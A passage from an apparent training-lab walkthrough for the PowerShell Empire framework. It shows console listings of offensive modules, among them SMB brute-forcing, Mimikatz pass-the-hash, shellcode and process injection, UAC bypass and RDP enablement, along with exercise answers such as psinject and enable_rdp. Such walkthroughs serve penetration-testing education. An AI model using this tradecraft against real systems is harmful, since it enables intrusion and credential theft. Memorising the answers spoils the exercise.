 powershell/situational_awareness/network/get_sql_instance_domain

        Returns a list of SQL Server instances discovered by querying a domain
        controller for systems with registered MSSQL service principal names.
        The function will default to the current user's domain and logon
        server, but an alternative domain controller can be provided. UDP
        scanning of management servers is optional.


 powershell/situational_awareness/network/get_spn

        Displays Service Principal Names (SPN) for domain accounts based on
        SPN service name, domain account, or domain group via LDAP queries.


 powershell/situational_awareness/network/get_sql_server_info

        Returns basic server and user information from target SQL Servers.


 powershell/situational_awareness/network/arpscan

        Performs an ARP scan against a given range of IPv4 IP Addresses.


 powershell/situational_awareness/network/smbscanner

        Tests a username/password combination across a number of machines.


 powershell/situational_awareness/network/smbautobrute

        Runs an SMB brute against a list of usernames/passwords. Will check
        the DCs to interrogate the bad password count of the users and will
        keep bruting until either a valid credential is discoverd or the bad
        password count reaches one below the threshold. Run "shell net
        accounts" on a valid agent to determine the lockout threshold. VERY
        noisy! Generates a ton of traffic on the DCs.


 powershell/situational_awareness/network/bloodhound

        Execute BloodHound data collection.


 powershell/situational_awareness/network/bloodhound3

        Execute BloodHound data collection (ingestor for version 3).


 powershell/situational_awareness/network/reverse_dns

        Performs a DNS Reverse Lookup of a given IPv4 IP Range.


 powershell/situational_awareness/network/get_kerberos_service_ticket*

        Retrieves IP addresses and usernames using event ID 4769 this can
        allow identification of a users machine. Can only run on a domain
        controller.


 powershell/situational_awareness/network/smblogin

        Validates username & password combination(s) across a host or group of
        hosts using the SMB protocol.


 powershell/situational_awareness/network/portscan

        Does a simple port scan using regular sockets, based (pretty) loosely
        on nmap.


 powershell/situational_awareness/network/powerview/get_group

        Gets a list of all current groups in a domain, or all the groups a
        given user/group object belongs to. Part of PowerView.


 powershell/situational_awareness/network/powerview/get_domain_policy

        Returns the default domain or DC policy for a given domain or domain
        controller. Part of PowerView.


 powershell/situational_awareness/network/powerview/get_computer

        Queries the domain for current computer objects. Part of PowerView.


 powershell/situational_awareness/network/powerview/get_ou

        Gets a list of all current OUs in a domain. Part of PowerView.


 powershell/situational_awareness/network/powerview/process_hunter

        Query the process lists of remote machines, searching for processes
        with a specific name or owned by a specific user. Part of PowerView.


 powershell/situational_awareness/network/powerview/get_loggedon

        Execute the NetWkstaUserEnum Win32API call to query a given host for
        actively logged on users. Part of PowerView.


 powershell/situational_awareness/network/powerview/get_forest

        Return information about a given forest, including the root domain and
        SID. Part of PowerView.


 powershell/situational_awareness/network/powerview/get_gpo_computer

        Takes a GPO GUID and returns the computers the GPO is applied to.
        (Note: This function was removed in PowerView. This now uses a
        combination of two CmdLets to achieve the same functionality)


 powershell/situational_awareness/network/powerview/find_managed_security_group

        This function retrieves all security groups in the domain and
        identifies ones that have a manager set. It also determines whether
        the manager has the ability to add or remove members from the group.
        Part of PowerView.


 powershell/situational_awareness/network/powerview/get_object_acl

        Returns the ACLs associated with a specific active directory object.
        Part of PowerView. WARNING: specify a specific object, otherwise a
        huge amount of data will be returned.


 powershell/situational_awareness/network/powerview/get_fileserver

        Returns a list of all file servers extracted from user homedirectory,
        scriptpath, and profilepath fields. Part of PowerView.


 powershell/situational_awareness/network/powerview/get_subnet_ranges

        Pulls hostnames from AD, performs a Reverse DNS lookup, and parses the
        output into ranges.


 powershell/situational_awareness/network/powerview/get_rdp_session

        Query a given RDP remote service for active sessions and originating
        IPs (replacement for qwinsta). Note: needs admin rights on the remote
        server you're querying


 powershell/situational_awareness/network/powerview/map_domain_trust

        Maps all reachable domain trusts with .CSV output. Part of PowerView.


 powershell/situational_awareness/network/powerview/get_site

        Gets a list of all current sites in a domain. Part of PowerView.


 powershell/situational_awareness/network/powerview/get_group_member

        Returns the members of a given group, with the option to "Recurse" to
        find all effective group members. Part of PowerView.


 powershell/situational_awareness/network/powerview/get_domain_controller

        Returns the domain controllers for the current domain or the specified
        domain. Part of PowerView.


 powershell/situational_awareness/network/powerview/get_gpo

        Gets a list of all current GPOs in a domain. Part of PowerView.


 powershell/situational_awareness/network/powerview/find_foreign_user

        Enumerates users who are in groups outside of their principal domain.
        Part of PowerView.


 powershell/situational_awareness/network/powerview/get_domain_trust

        Return all domain trusts for the current domain or a specified domain.
        Part of PowerView.


 powershell/situational_awareness/network/powerview/find_foreign_group

        Enumerates all the members of a given domain's groups and finds users
        that are not in the queried domain. Part of PowerView.


 powershell/situational_awareness/network/powerview/get_localgroup

        Returns a list of all current users in a specified local group on a
        local or remote machine. Part of PowerView.


 powershell/situational_awareness/network/powerview/get_subnet

        Gets a list of all current subnets in a domain. Part of PowerView.


 powershell/situational_awareness/network/powerview/get_session

        Execute the NetSessionEnum Win32API call to query a given host for
        active sessions on the host. Part of PowerView.


 powershell/situational_awareness/network/powerview/get_cached_rdpconnection

        Uses remote registry functionality to query all entries for the
        Windows Remote Desktop Connection Client" on a machine. Part of
        PowerView.


 powershell/situational_awareness/network/powerview/user_hunter

        Finds which machines users of a specified group are logged into. Part
        of PowerView.


 powershell/situational_awareness/network/powerview/find_localadmin_access

        Finds machines on the local domain where the current user has local
        administrator access. Part of PowerView.


 powershell/situational_awareness/network/powerview/find_gpo_location

        Takes a user/group name and optional domain, and determines the
        computers in the domain the user/group has local admin (or RDP) rights
        to. Part of PowerView.


 powershell/situational_awareness/network/powerview/set_ad_object

        Takes a SID, name, or SamAccountName to query for a specified domain
        object, and then sets a specified "PropertyName" to a specified
        "PropertyValue". Part of PowerView.


 powershell/situational_awareness/network/powerview/share_finder

        Finds shares on machines in the domain. Part of PowerView.


 powershell/situational_awareness/network/powerview/find_gpo_computer_admin

        Takes a computer (or GPO) object and determines what users/groups have
        administrative access over it. Part of PowerView.


 powershell/situational_awareness/network/powerview/get_dfs_share

        Returns a list of all fault-tolerant distributed file systems for a
        given domain. Part of PowerView.


 powershell/situational_awareness/network/powerview/get_forest_domain

        Return all domains for a given forest. Part of PowerView.


 powershell/situational_awareness/network/powerview/get_user

        Query information for a given user or users in the specified domain.
        Part of PowerView.


 powershell/collection/netripper

        Injects NetRipper into targeted processes, which uses API hooking in
        order to intercept network traffic and encryption related functions
        from a low privileged user, being able to capture both plain-text
        traffic and encrypted traffic before encryption/after decryption.


 powershell/recon/find_fruit

        Searches a network range for potentially vulnerable web services.


 powershell/recon/fetch_brute_local

        This module will logon to a member server using the agents account or
        a provided account, fetch the local accounts and perform a network
        based brute force attack.
```

`recon`

12. Our process we have compromised might not be the most stable, how do we migrate to another process? (This will have a specific module answer)

```
(Empire: FKRDZB8C) > searchmodule process

 python/management/osx/shellcodeinject64*

        Inject shellcode into a x64 bit process


 powershell/credentials/tokens

        Runs PowerSploit's Invoke-TokenManipulation to enumerate Logon Tokens
        available and uses them to create new processes. Similar to
        Incognito's functionality. Note: if you select ImpersonateUser or
        CreateProcess, you must specify one of Username, ProcessID, Process,
        or ThreadId.


 powershell/credentials/mimikatz/pth*

        Runs PowerSploit's Invoke-Mimikatz function to execute sekurlsa::pth
        to create a new process. with a specific user's hash. Use
        credentials/tokens to steal the token afterwards.


 powershell/situational_awareness/host/paranoia*

        Continuously check running processes for the presence of suspicious
        users, members of groups, process names, and for any processes running
        off of USB drives.


 powershell/situational_awareness/network/powerview/process_hunter

        Query the process lists of remote machines, searching for processes
        with a specific name or owned by a specific user. Part of PowerView.


 powershell/collection/minidump

        Generates a full-memory dump of a process. Note: To dump another
        user's process, you must be running from an elevated prompt (e.g to
        dump lsass)


 powershell/collection/netripper

        Injects NetRipper into targeted processes, which uses API hooking in
        order to intercept network traffic and encryption related functions
        from a low privileged user, being able to capture both plain-text
        traffic and encrypted traffic before encryption/after decryption.


 powershell/trollsploit/process_killer

        Kills any process starting with a particular name.


 powershell/trollsploit/rick_ascii

        Spawns a a new powershell.exe process that runs Lee Holmes' ASCII Rick
        Roll.


 powershell/trollsploit/rick_astley

        Runs @SadProcessor's beeping rickroll.


 powershell/management/reflective_inject

        Utilizes Powershell to to inject a Stephen Fewer formed ReflectivePick
        which executes PS codefrom memory in a remote process


 powershell/management/psinject

        Utilizes Powershell to to inject a Stephen Fewer formed ReflectivePick
        which executes PS codefrom memory in a remote process. ProcID or
        ProcName must be specified.


 powershell/management/spawn

        Spawns a new agent in a new powershell.exe process.


 powershell/management/shinject

        Injects a PIC shellcode payload into a target process, via Invoke-
        Shellcode


 powershell/code_execution/invoke_dllinjection

        Uses PowerSploit's Invoke-DLLInjection to inject  a Dll into the
        process ID of your choosing.


 powershell/code_execution/invoke_reflectivepeinjection

        Uses PowerSploit's Invoke-ReflectivePEInjection to reflectively load a
        DLL/EXE in to the PowerShell process or reflectively load a DLL in to
        a remote process.


 powershell/code_execution/invoke_shellcodemsil

        Execute shellcode within the context of the running PowerShell process
        without making any Win32 function calls. Warning: This script has no
        way to validate that your shellcode is 32 vs. 64-bit!Note: Your
        shellcode must end in a ret (0xC3) and maintain proper stack alignment
        or PowerShell will crash!


 powershell/code_execution/invoke_shellcode

        Uses PowerSploit's Invoke--Shellcode to inject shellcode into the
        process ID of your choosing or within the context of the running
        PowerShell process. If you're injecting custom shellcode, make sure
        it's in the correct format and matches the architecture of the process
        you're injecting into.


 powershell/privesc/ask

        Leverages Start-Process' -Verb runAs option inside a YES-Required loop
        to prompt the user for a high integrity context before running the
        agent code. UAC will report Powershell is requesting Administrator
        privileges. Because this does not use the BypassUAC DLLs, it should
        not trigger any AV alerts.


 powershell/privesc/bypassuac

        Runs a BypassUAC attack to escape from a medium integrity process to a
        high integrity process. This attack was originally discovered by Leo
        Davidson. Empire uses components of MSF's bypassuac injection
        implementation as well as an adapted version of PowerSploit's Invoke--
        Shellcode.ps1 script for backend lifting.
```

`powershell/management/psinject`

13. Last but not least, what module can we use to turn on remote desktop access for our purposes?

```
(Empire: FKRDZB8C) > searchmodule rdp

 python/collection/osx/pillage_user

        Pillages the current user for their keychain, bash_history, ssh known
        hosts, recent folders, etc. For logon.keychain, use
        https://github.com/n0fate/chainbreaker .For other .plist files, check
        https://davidkoepi.wordpress.com/2013/07/06/macforensics5/


 powershell/credentials/sessiongopher

        Extract saved sessions & passwords for WinSCP, PuTTY, SuperPuTTY,
        FileZilla, RDP, .ppk files, .rdp files, .sdtid files


 powershell/situational_awareness/network/powerview/get_rdp_session

        Query a given RDP remote service for active sessions and originating
        IPs (replacement for qwinsta). Note: needs admin rights on the remote
        server you're querying


 powershell/situational_awareness/network/powerview/get_cached_rdpconnection

        Uses remote registry functionality to query all entries for the
        Windows Remote Desktop Connection Client" on a machine. Part of
        PowerView.


 powershell/situational_awareness/network/powerview/find_gpo_location

        Takes a user/group name and optional domain, and determines the
        computers in the domain the user/group has local admin (or RDP) rights
        to. Part of PowerView.


 powershell/management/enable_rdp*

        Enables RDP on the remote machine and adds a firewall exception.


 powershell/management/enable_multi_rdp*

        [!] WARNING: Experimental! Runs PowerSploit's Invoke-Mimikatz function
        to patch the Windows terminal service to allow multiple users to
        establish simultaneous RDP connections.


 powershell/management/disable_rdp*

        Disables RDP on the remote machine.
```

`powershell/management/enable_rdp`
